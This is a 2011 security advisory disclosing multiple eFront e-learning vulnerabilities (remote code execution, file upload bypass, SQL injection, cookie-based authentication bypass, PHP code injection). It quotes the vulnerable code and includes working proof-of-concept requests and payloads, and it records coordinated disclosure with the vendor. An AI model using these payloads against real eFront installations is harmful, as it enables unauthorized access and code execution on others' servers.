eFront <= 3.6.10 (build 11944) Multiple Security Vulnerabilities
----------------------------------------------------------------
 
author.............: EgiX
mail...............: n0b0d13s[at]gmail[dot]com
software link......: http://www.efrontlearning.net/
tested versions....: 3.6.7 - 3.6.9 - 3.6.10
 
+-----------------------+
| Remote Code Execution |
+-----------------------+
 
The vulnerable code is located in /www/editor/tiny_mce/plugins/save_template/save_template.php
 
8.    if ($_POST[&#039;templateName&#039;]) {
9.        $dir = &#039;../../../../content/editor_templates/&#039;.$_SESSION[&#039;s_login&#039;];
10.       if (!is_dir($dir) && !mkdir($dir, 0755)) {
11.           throw new Exception(_COULDNOTCREATEDIRECTORY);
12.       }
13.  
14.       $filename = $dir.&#039;/&#039;.$_POST[&#039;templateName&#039;].&#039;.html&#039;;
15.       $templateContent = $_POST[&#039;templateContent&#039;];
16.       if(file_exists($filename) === false) {
17.           $ok = file_put_contents($filename, $templateContent);
18.           chmod($filename, 0644);
 
Input passed through $_POST[&#039;templateName&#039;] and $_POST[&#039;templateContent&#039;] isn&#039;t sanitized before being
used in a call to file_put_contents() at line 17, this can be exploited to write arbitrary PHP code in
a file with .php extension also if magic_quotes_gpc = on. Proof of concept request:
 
 POST /efront/www/editor/tiny_mce/plugins/save_template/save_template.php HTTP/1.1
 Host: localhost
 Content-Length: 60
 Content-Type: application/x-www-form-urlencoded
 Connection: keep-alive
 
 templateName=sh.php%00&templateContent=<?php evil_code(); ?>
  
Successful exploitation of this vulnerability doesn&#039;t require authentication.
 
+--------------------------+
| Unrestricted File Upload |
+--------------------------+
 
The vulnerable code is located in /libraries/filesystem.class.php
 
3143.     public static function checkFile($name) {
3144.     if ($GLOBALS[&#039;configuration&#039;][&#039;file_black_list&#039;] != &#039;&#039;) {
3145.          $blackList = explode(",", $GLOBALS[&#039;configuration&#039;][&#039;file_black_list&#039;]);
3146.     } else {
3147.       $blackList = array();
3148.     }
3149.     $blackList[] = &#039;php&#039;;
3150.         $extension = pathinfo($name, PATHINFO_EXTENSION);
3151.         foreach ($blackList as $value) {
3152.             if ($extension == trim(mb_strtolower($value))) {
3153.                 throw new EfrontFileException(_YOUCANNOTUPLOADFILESWITHTHISEXTENSION.&#039;: &#039;.$extension, EfrontFileException::FILE_IN_BLACK_LIST);
3154.             }
 
The FileSystemTree::uploadFile() method handles all uploads and It uses checkFile() method to verify the extension
of the uploaded file. Here is compared the uploaded file extension with every extension in the &#039;file_black_list&#039; array,
that is constructed by this default configuration: "php,php3,jsp,asp,cgi,pl,exe,com,bat" and, as you can see, It doesn&#039;t
contains others dangerous extension like phtml, pwml, php4, php5, inc... But the really problem is that at line 3152
the uploaded file extension is simply compared with == operator, so an attacker could be able to upload for e.g. an
avatar with .PHP extension. This is possible only if &#039;file_white_list&#039; configuration is blank (such as by default).
 
+-----------------------------------+
| SQL Injection in UPDATE statement |
+-----------------------------------+
  
First look at the getUserTimeTarget() function defined into /libraries/tools.php
 
2776. function getUserTimeTarget($url) {
2777.  //return $_SESSION[&#039;s_time_target&#039;];
2778.  if (isset($_SESSION[&#039;s_lessons_ID&#039;]) && $_SESSION[&#039;s_lessons_ID&#039;]) {
2779.   $entity = array($_SESSION[&#039;s_lessons_ID&#039;] => &#039;lesson&#039;);
2780.  } else {
2781.   $entity = array(0 => &#039;system&#039;);
2782.  }
2783.  $urlParts = parse_url($url);
2784.  $queryParts = explode(&#039;&&#039;, $urlParts[&#039;query&#039;]);
2785.  foreach($queryParts as $part) {
2786.   $result = explode("=", $part);
2787.   switch ($result[0]) {
2788.    case &#039;view_unit&#039;:
2789.    case &#039;package_ID&#039;: $entity = array($result[1] => &#039;unit&#039;); break;
2790.    default: break;
2791.   }
2792.  }
2793.  return $entity;
2794. }
 
It parses the given URL, and if in the query string is defined a &#039;package_ID&#039; variable his content is
used as a key for the $entity array. Now look the vulnerable code located in /www/periodic_updater.php
 
32.    if ($_SESSION[&#039;s_login&#039;]) {
33.     $entity = getUserTimeTarget($_GET[&#039;HTTP_REFERER&#039;]);
34.     //$entity = $_SESSION[&#039;s_time_target&#039;];
35.      //Update times for this entity
36.     $result = eF_executeNew("update user_times set time=time+(".time()."-timestamp_now),timestamp_now=".time()."
37.           where session_expired = 0 and session_custom_identifier = &#039;".$_SESSION[&#039;s_custom_identifier&#039;]."&#039; and users_LOGIN = &#039;".$_SESSION[&#039;s_login&#039;]."&#039;
38.            and entity = &#039;".current($entity)."&#039; and entity_id = &#039;".key($entity)."&#039;");
 
Input passed through $_GET[&#039;HTTP_REFERER&#039;] is passed to getUserTimeTarget() function at line 33 and the return value is
used in call to eF_executeNew() at line 38. So an attacker could request an URL like this to inject arbitrary SQL code:
 
 http://localhost/efront/www/periodic_updater.php?HTTP_REFERER=http://host/?package_ID=[SQL]
 
In older version input is taken from $_SERVER[&#039;HTTP_REFERER&#039;] instead of $_GET[&#039;HTTP_REFERER&#039;], but is still vulnerable.
Successful exploitation of this vulnerability requires authentication.
 
+---------------+
| SQL Injection |
+---------------+
 
The vulnerable code is located in /www/js/LMSFunctions.php
 
13.   /*These lines read SCO data for this student and pass them to the javascript code through the LMSToSCOValues variable*/
14.   $result = eF_getTableData("scorm_data", "*", "users_LOGIN = &#039;".$_SESSION[&#039;s_login&#039;]."&#039; AND content_ID = &#039;".$_GET[&#039;view_unit&#039;]."&#039;");
15.   sizeof($result) ? $LMSToSCOValues = $result[0] : $LMSToSCOValues = array();
 
Input passed through $_GET[&#039;view_unit&#039;] isn&#039;t properly sanitized before being used in a call
to eF_getTableData() function at line 14, this can be exploited to inject arbitrary SQL code.
Successful exploitation of this vulnerability doesn&#039;t require authentication or magic_quotes_gpc = off.
   
+---------------+
| SQL Injection |
+---------------+
 
The vulnerable code is located in /www/send_notifications.php
 
69.   } else if (isset($_GET[&#039;sent_notification_id&#039;])) {
70.    $sent_notification = eF_getTableData("sent_notifications", "*", "id = " . $_GET[&#039;sent_notification_id&#039;]);
71.    if (!empty ($sent_notification)) {
 
Input passed through $_GET[&#039;sent_notification_id&#039;] isn&#039;t properly sanitized before being used in a
call to eF_getTableData() function at line 70, this can be exploited to inject arbitrary SQL code.
Successful exploitation of this vulnerability doesn&#039;t require authentication or magic_quotes_gpc = off.
 
+------------------------------------------------+
| Authentication Bypass and Privilege Escalation |
+------------------------------------------------+
 
The vulnerable code is located in /www/index.php
 
206.  if (isset($_COOKIE[&#039;cookie_login&#039;]) && isset($_COOKIE[&#039;cookie_password&#039;])) {
207.   try {
208.    $user = EfrontUserFactory :: factory($_COOKIE[&#039;cookie_login&#039;]);
209.    $user -> login($_COOKIE[&#039;cookie_password&#039;], true);
 
Input passed through $_COOKIE[&#039;cookie_login&#039;] isn&#039;t properly sanitized before being used at
line 208 to instanciate a new user object using EfrontUserFactory::factory() method, this can
be exploited to bypass authentication and to escalate privilege. Proof of concept request:
 
 GET /efront/www/index.php HTTP/1.1
 Host: localhost
 Cookie: cookie_login[login]=admin;cookie_login[active]=1;cookie_login[user_type]=administrator;cookie_login[password]=1;cookie_password=1
 Connection: keep-alive
  
+--------------------+
| PHP Code Injection |
+--------------------+
 
The vulnerable code is located in /www/student.php
 
123.       if (isset($_GET[&#039;course&#039;]) || isset($_GET[&#039;from_course&#039;])) {
124.              if ($_GET[&#039;course&#039;]) {
125.            $course = new EfrontCourse($_GET[&#039;course&#039;]);
126.              } else {
127.               $course = new EfrontCourse($_GET[&#039;from_course&#039;]);
128.              }
129.              $eligibility = $course -> checkRules($_SESSION[&#039;s_login&#039;]);
 
Input passed through $_GET[&#039;course&#039;] (or $_GET[&#039;from_course&#039;]) isn&#039;t properly sanitized before being
used to instantiate a new EfrontCourse object, this can be exploited to inject and execute arbitrary
PHP code because of EfrontCourse::checkRules() method calls eval() function using the &#039;rules&#039; object&#039;s
property (see /libraries/course.class.php near lines 3638-3645). Successful exploitation of this
vulnerability requires at least a student account with at least one completed lesson.
Proof of concept request:
 
 /student.php?lessons_ID=1&course[id]=1&course[directions_ID]=1&course[rules]=a:1:{s:19:"1];phpinfo();die;/*";a:1:{s:6:"lesson";i:0;}}
 
 
[-] Conclusion:
 
The latest two vulnerabilities emphasizes a critical design flaw. To understand what I means look
at the constructor method of EfrontEntity (a generic class used as parent for some objects):
 
64.       public function __construct($param) {
65.           if (!$this -> entity) {
66.               $this -> entity = strtolower(str_replace(&#039;Efront&#039;, &#039;&#039;, get_class($this)));
67.           }
68.           if (!is_array($param)) {
69.            if (!eF_checkParameter($param, &#039;id&#039;)) {
70.                throw new EfrontEntityException(_INVALIDID.&#039;: &#039;.$param, EfrontEntityException :: INVALID_ID);
71.            }
72.            $result = eF_getTableData($this -> entity, "*", "id=$param");
73.            if (sizeof($result) == 0) {
74.                throw new EfrontEntityException(_ENTITYNOTFOUND.&#039;: &#039;.htmlspecialchars($param), EfrontEntityException :: ENTITY_NOT_EXIST);
75.            }
76.            $this -> {$this -> entity} = $result[0];
77.           } else {
78.               $this -> {$this -> entity} = $param;
79.           }
80.       }
 
If the $param variable is an array, It&#039;s used to initialize all the object properties and this
mechanism is used in almost all classes. So everytime in the code will appear something like
 
 $object = new EfrontObject($_GET[&#039;param&#039;]);
  
and $_GET[&#039;param&#039;] isn&#039;t properly sanitized, there is an high probability to lead in bugs such as
SQL Injection, PHP Code Injection, LFI etc... because an attacker could pass parameter in array
form and so he might be able to change the internal property of the objects with arbitrary data.
So I think that could there be some other bugs, for this reason I would recommend to the eFront
developers a complete source code review focused on security.
 
 
[-] Disclosure timeline:
 
[08/10/2011] - Vulnerabilities discovered
[09/10/2011] - Others vulnerabilities discovered
[11/10/2011] - Issues reported to http://bugs.efrontlearning.net/browse/EF-675
[26/10/2011] - Vendor update released: http://forum.efrontlearning.net/viewtopic.php?t=3501
[27/10/2011] - Public disclosure



